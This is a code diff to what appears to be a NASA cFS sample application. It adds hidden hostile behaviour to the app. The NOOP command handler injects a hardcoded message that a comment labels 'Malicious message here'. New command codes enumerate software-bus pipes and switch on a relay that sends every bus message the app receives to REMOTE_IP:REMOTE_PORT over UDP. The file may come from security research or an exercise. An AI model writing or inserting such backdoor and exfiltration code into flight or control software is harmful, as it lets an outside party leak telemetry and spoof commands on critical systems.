@@ -31,21 +31,6 @@
 #include "sample_app_msgids.h"
 #include "sample_app_msg.h"
 
-/*
-void send_to_socket(const char* ip, int port, void* buffer, int buflen)
-{
-    osal_id_t sock_id;
-    OS_SockAddr_t remote_addr;
-
-    OS_SocketOpen(&sock_id, OS_SocketDomain_INET, OS_SocketType_DATAGRAM);
-    OS_SocketAddrInit(&remote_addr, OS_SocketDomain_INET);
-    OS_SocketAddrSetPort(&remote_addr, port);
-    OS_SocketAddrFromString(&remote_addr, ip);
-    OS_SocketSendTo(sock_id, buffer, buflen, &remote_addr);
-    OS_close(sock_id);
-
-}
-*/
 /* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * **/
 /*                                                                            */
 /* Verify command packet length                                               */
@@ -104,20 +89,19 @@ void SAMPLE_APP_ProcessGroundCommand(const CFE_SB_Buffer_t *SBBufPtr)
     */
 
     long long int potMsg = 0x2000010000c00618; // es_noop
+    long long int buffer = potMsg;
 
     CFE_MSG_Message_t* MsgPtr = (CFE_MSG_Message_t *) &(potMsg);
 
     /*
     ** Process SAMPLE app ground commands
     */
-    long long int buffer = potMsg;
 
     switch (CommandCode) // commandCode is number 0-X for different commands
     {
         case SAMPLE_APP_NOOP_CC:
 
             CFE_SB_TransmitMsg(MsgPtr, true); // Malicious message here
-
             if (SAMPLE_APP_VerifyCmdLength(&SBBufPtr->Msg, sizeof(SAMPLE_APP_NoopCmd_t)))
             {
                 SAMPLE_APP_NoopCmd((const SAMPLE_APP_NoopCmd_t *)SBBufPtr);
@@ -147,6 +131,17 @@ void SAMPLE_APP_ProcessGroundCommand(const CFE_SB_Buffer_t *SBBufPtr)
                 SAMPLE_APP_DisplayParamCmd((const SAMPLE_APP_DisplayParamCmd_t *)SBBufPtr);
             }
             break;
+        case SAMPLE_APP_SEND_PIPES_CC:
+            find_pipes();
+//            CFE_SB_TransmitMsg(MsgPtr, true); // test for now
+            CFE_EVS_SendEvent(SAMPLE_APP_CC_ERR_EID, CFE_EVS_EventType_ERROR, "Send pipe comand code: CC = %d",
+                              CommandCode);
+            break;
+        case SAMPLE_APP_SEND_SB_CC:
+            relay_data = !relay_data;
+            CFE_EVS_SendEvent(SAMPLE_APP_CC_ERR_EID, CFE_EVS_EventType_ERROR, "Send SB comand code: CC = %d",
+                              CommandCode);
+            break;
 
         /* default case already found during FC vs length test */
         default:
@@ -173,9 +168,15 @@ void SAMPLE_APP_TaskPipe(const CFE_SB_Buffer_t *SBBufPtr)
     /*
     ** Print any commands sent on buffer since sample is subscribed to all major headers
     */
+
 //    CFE_ES_WriteToSysLog("Sample App: Command Packet: 0x%x\n", (unsigned int)CFE_SB_MsgIdToValue(MsgId));
 //    CFE_ES_WriteToSysLog("Sample App: Command Info: %llx", (long long int)SBBufPtr->LongInt);
 
+    if (relay_data)
+    {
+        long long int msg = (long long int)SBBufPtr->LongInt;
+        send_to_socket(REMOTE_IP, REMOTE_PORT, &msg, sizeof(msg));
+    }
     switch (CFE_SB_MsgIdToValue(MsgId))
     {
         case SAMPLE_APP_CMD_MID:
